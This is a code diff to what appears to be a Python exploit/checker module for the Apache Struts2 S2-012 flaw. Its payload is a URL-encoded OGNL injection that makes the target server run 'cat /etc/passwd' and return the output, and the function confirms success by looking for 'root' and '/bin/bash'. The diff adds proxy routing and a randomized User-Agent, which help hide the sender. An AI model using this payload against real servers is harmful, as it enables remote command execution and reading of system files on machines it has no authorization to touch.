@@ -16,7 +16,7 @@ def UrlProcessing(url):
 payload='''
 name=%25%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%22cat%22%2c+%22%2fetc%2fpasswd%22%7d)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b50000%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(new+java.lang.String(%23e))%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d
 '''
-def S2_012(Url,RandomAgent):
+def S2_012(Url,RandomAgent,ProxyIp):
 
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -32,7 +32,7 @@ def S2_012(Url,RandomAgent):
         'Accept-Encoding': 'gzip, deflate',
         'Accept': '*/*',
         'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
-        'User-Agent': 'Mozilla/5.0(compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+        'User-Agent':RandomAgent,
         'Connection': 'close',
         'Content-Type': 'application/x-www-form-urlencoded',
         'Content-Length': '571',
@@ -41,7 +41,15 @@ def S2_012(Url,RandomAgent):
     }
     s = requests.session()
     try:
-        resp = s.get(payload_url,headers=headers, timeout=5, verify=False)
+        if ProxyIp != None:
+            proxies = {
+                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+                "http": "http://" + str(ProxyIp)
+            }
+            resp = s.get(payload_url, headers=headers,proxies=proxies, timeout=5, verify=False)
+
+        elif ProxyIp == None:
+            resp = s.get(payload_url,headers=headers, timeout=5, verify=False)
         con = resp.text
         code = resp.status_code
         if code==200 and con.lower().find('root')!=-1 and con.lower().find('/bin/bash')!=-1:
